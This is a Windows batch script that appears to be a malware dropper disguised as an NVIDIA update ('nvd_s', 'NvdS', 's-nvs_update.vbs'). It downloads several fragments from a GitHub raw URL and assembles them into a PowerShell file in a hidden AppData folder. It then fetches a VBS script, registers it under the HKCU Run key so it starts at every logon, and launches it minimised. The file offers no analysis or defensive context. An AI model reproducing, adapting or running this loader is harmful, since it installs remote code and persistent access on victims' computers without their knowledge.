@echo off
timeout /t 4 /nobreak >nul
set "q1=%APPDATA%\nvd_s\dt"
set "r2=%q1%\n_main.txt"
set "s3=%q1%\p1.txt"
set "t4=%q1%\p2.txt"
set "u5=%q1%\NVD_S.PS1"
set "v6=%q1%\strt_n.vbs"
if exist "%q1%" rmdir /s /q "%q1%" 2>nul
timeout /t 3 /nobreak >nul
mkdir "%q1%"
set "d1=raw.githubusercontent.com/USATIKTOKER/major/main"
powershell -Command "$d1='%d1%';Start-BitsTransfer -Source ('https://{0}/final.txt' -f $d1) -Destination '%r2%'"
timeout /t 2 /nobreak >nul
powershell -Command "$d1='%d1%';Start-BitsTransfer -Source ('https://{0}/first.txt' -f $d1) -Destination '%s3%'"
powershell -Command "Start-BitsTransfer -Source **** -Destination '%t4%'"
timeout /t 1 /nobreak >nul
powershell -Command "(Get-Content '%r2%' -Raw) -replace '----', (Get-Content '%s3%' -Raw) -replace '====', (Get-Content '%t4%' -Raw) | Set-Content '%r2%'"
del "%s3%" 2>nul
del "%t4%" 2>nul
ren "%r2%" "NVD_S.PS1"
timeout /t 2 /nobreak >nul
powershell -Command "$d1='%d1%';Invoke-WebRequest ('https://{0}/s-nvs_update.vbs' -f $d1) -OutFile '%v6%'"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'NvdS' -Value 'wscript.exe \"%v6%\"'"
timeout /t 3 /nobreak >nul
start /min wscript "%v6%"
